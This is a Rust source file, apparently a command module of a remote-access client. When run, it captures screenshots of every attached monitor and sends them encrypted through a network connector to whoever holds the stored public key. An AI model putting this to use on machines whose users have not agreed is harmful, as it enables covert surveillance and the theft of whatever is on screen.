use xcap::{image::EncodableLayout, Monitor};

use crate::connector::Connector;

#[derive(Clone, Debug)]
pub struct Screenshot {
    name: String,
}
impl Screenshot {
    pub fn new() -> Screenshot {
        Screenshot {
            name: "screenshot".to_string(),
        }
    }
    pub fn get_command(&self) -> String {
        self.name.to_string()
    }
    pub async fn run(&self, connector: &mut Connector) {
        let monitors = Monitor::all().unwrap();
        connector
            .send_hybrid_encryption(
                connector.public_key.clone().unwrap(),
                monitors.len().to_string().into_bytes(),
            )
            .await;
        for monitor in monitors {
            let image = monitor.capture_image().unwrap();
            connector
                .send_hybrid_encryption(
                    connector.public_key.clone().unwrap(),
                    image.as_bytes().to_vec(),
                )
                .await;
        }
    }
}
